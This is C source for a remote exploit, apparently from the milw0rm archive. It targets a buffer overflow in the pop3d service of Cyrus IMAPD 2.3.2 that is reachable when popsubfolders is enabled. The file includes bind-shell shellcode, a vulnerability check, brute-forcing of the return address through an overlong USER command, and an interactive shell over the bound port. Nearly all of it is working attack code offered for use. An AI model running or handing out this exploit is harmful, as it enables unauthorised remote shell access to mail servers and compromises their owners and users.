<html><head><title>Cyrus IMAPD 2.3.2 (pop3d) Remote Buffer Overflow Exploit</title></head><pre>/* zeroday warez
 * !!! PRIVATE - DONT DISTRIBUTE - PRIVATE !!!
 *********************************************
 * cyruspop3d.c - cyrus pop3d remote exploit by kcope
 * tested on cyrus-imapd-2.3.2,linux
 *
 * bug found 23 Apr 2006 by kcope
 *--------------------------------------------
 *
 * imapd/pop3d.c line 1830 :
 * char userbuf[MAX_MAILBOX_NAME+1], *p;
 * ...
 * if (!ulen) ulen = strlen(user);
 *   if (config_getswitch(IMAPOPT_POPSUBFOLDERS)) {
 *    memcpy(userbuf, user, ulen);
 *    userbuf[ulen] = '\0';
 * ...
 * popsubfolders has to be enabled
 *
 * thnx to blackzero revoguard wY! qobaiashi bogus alex
 * Love to Lisa :-)
 *********************************************
 * !!! PRIVATE - DONT DISTRIBUTE - PRIVATE !!!
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netdb.h&gt;
#include &lt;errno.h&gt;

#define POP3PORT 110
#define BINDPORT 13370

unsigned char shellcode[] =
&quot;\x31\xdb\x53\x43\x53\x6a\x02\x6a\x66\x58\x99\x89\xe1\xcd\x80\x96&quot;
&quot;\x43\x52\x66\x68\x34\x3a\x66\x53\x89\xe1\x6a\x66\x58\x50\x51\x56&quot;
&quot;\x89\xe1\xcd\x80\xb0\x66\xd1\xe3\xcd\x80\x52\x52\x56\x43\x89\xe1&quot;
&quot;\xb0\x66\xcd\x80\x93\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0&quot;
&quot;\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53&quot;
&quot;\x89\xe1\xcd\x80&quot;;

int do_connect (char *remotehost, int port)
{
   static struct hostent *host;
   static struct sockaddr_in addr;
   static int done=0;
   int s;

   if (!inet_aton(remotehost, &amp;addr.sin_addr) &amp;&amp; (done != 1))
   {
       host = gethostbyname(remotehost);
       if (!host)
       {
           perror(&quot;gethostbyname() failed&quot;);
           return -1;
       }
       addr.sin_addr = *(struct in_addr*)host-&gt;h_addr;
   }

   s = socket(PF_INET, SOCK_STREAM, 0);
   if (s == -1)
   {
       close(s);
       perror(&quot;socket() failed&quot;);
       return -1;
   }

   addr.sin_port = htons(port);
   addr.sin_family = AF_INET;

   if (connect(s, (struct sockaddr*)&amp;addr, sizeof(addr)) == -1)
   {
       close(s);
       if (port == POP3PORT) perror(&quot;connect() failed&quot;);
       return -1;
   }

   done=1;
   return s;
}

void do_exploit(int sock, unsigned int returnaddr)
{
   char nops[360];
   char nops2[100];
   char exploitbuffer[1024];
   char recvbuf[30];

   memset(&amp;nops[0], '\0', sizeof(nops));
   memset(&amp;nops[0], 'A', 352);
   memset(&amp;nops2[0], '\0', sizeof(nops2));
   memset(&amp;nops2[0], 'A', 90);

   while (1) {
       recv(sock, recvbuf, 1, 0);
       if ((recvbuf[0] == '\r') || (recvbuf[0] == '\n')) break;
   }

   sprintf(exploitbuffer, &quot;USER %s%s%s\r\n&quot;, nops, shellcode, nops2);

   exploitbuffer[strlen(exploitbuffer)-1] = (returnaddr &gt;&gt; 24) &amp; 0xff;
   exploitbuffer[strlen(exploitbuffer)-2] = (returnaddr &gt;&gt; 16) &amp; 0xff;
   exploitbuffer[strlen(exploitbuffer)-3] = (returnaddr &gt;&gt; 8) &amp; 0xff;
   exploitbuffer[strlen(exploitbuffer)-4] = (returnaddr) &amp; 0xff;

   send(sock, exploitbuffer, strlen(exploitbuffer), 0);
   recv(sock, recvbuf, sizeof(recvbuf)-1, 0);
}

int do_checkvulnerable(int sock) {
   char checkbuffer[1024];
   char recvbuffer[10];

   memset(&amp;checkbuffer[0], '\0', sizeof(checkbuffer)-1);
   memset(&amp;checkbuffer[0], 'A', sizeof(checkbuffer)-2);
   checkbuffer[0]='U';
   checkbuffer[1]='S';
   checkbuffer[2]='E';
   checkbuffer[3]='R';
   checkbuffer[4]=' ';
   checkbuffer[sizeof(checkbuffer)-3]='\r';
   checkbuffer[sizeof(checkbuffer)-2]='\n';

   while (1) {
       recv(sock, recvbuffer, 1, 0);
       if ((recvbuffer[0] == '\r') || (recvbuffer[0] == '\n')) break;
   }

   send(sock, checkbuffer, strlen(checkbuffer), 0);

   if (recv(sock, recvbuffer, sizeof(recvbuffer)-1, MSG_WAITALL) &lt; 3)
       return 0;

   return -1;
}

int do_remote_shell(int sockfd)
{
   while(1)
        {
           fd_set fds;
           FD_ZERO(&amp;fds);
           FD_SET(0,&amp;fds);
           FD_SET(sockfd,&amp;fds);
           if(select(FD_SETSIZE,&amp;fds,NULL,NULL,NULL))
           {
              int cnt;
              char buf[1024];
              if(FD_ISSET(0,&amp;fds))
              {
                 if((cnt=read(0,buf,1024))&lt;1)
                 {
                    if(errno==EWOULDBLOCK||errno==EAGAIN)
                      continue;
                    else
                      break;
                 }
                 write(sockfd,buf,cnt);
              }
              if(FD_ISSET(sockfd,&amp;fds))
              {
                 if((cnt=read(sockfd,buf,1024))&lt;1)
                 {
                      if(errno==EWOULDBLOCK||errno==EAGAIN)
                        continue;
                      else
                        break;
                 }
                 write(1,buf,cnt);
              }
           }
        }
}

int main(int argc, char **argv)
{
   char remotehost[255];
   int s,s2,i;
   unsigned int returnaddr;

   printf(&quot;cyrus pop3d remote exploit [kcope/2006]\n&quot;);

   if (argc &lt; 3) {
       printf(&quot;usage: %s &lt;remote host&gt; &lt;brute force start return address&gt;\n&quot;, argv[0]);
       printf(&quot;eg: %s localhost bfffa000\n&quot;, argv[0]);
       return 1;
   }

   strcpy(remotehost, argv[1]); //uhoho
   if (sscanf(argv[2], &quot;%8x&quot;, &amp;returnaddr) == 0) {
       printf(&quot;Specify valid start return address\n&quot;);
       return 1;
   }

   printf(&quot;Checking if vulnerable... &quot;);
   s=do_connect(remotehost, POP3PORT);
   if (do_checkvulnerable(s) == -1) {
       close(s);
       printf(&quot;\ncyrus pop3d seems not to be vulnerable\nno popsubfolders defined at remote host?\n&quot;);
       return 1;
   }
   close(s);
   printf(&quot;SUCCESS!\n&quot;);

   while (returnaddr &lt; 0xbfffffff) {
       returnaddr+=16;

       printf(&quot;CRACKADDR = %4x\n&quot;, returnaddr);
       fflush(stdout);
       s=do_connect(remotehost, POP3PORT);
       if (s==-1)
           return 1;

       do_exploit(s, returnaddr);
       for (i=0;i&lt;2;i++) {
           if ((s2=do_connect(remotehost, BINDPORT)) != -1) {
               printf(&quot;\nALEX,ALEX WE GOT IT!!!\n&quot;);
               do_remote_shell(s2);
               return 0;
           }
           close(s2);
       }

       close(s);
   }

   return 0;
}

// milw0rm.com [2006-05-21]</pre></html>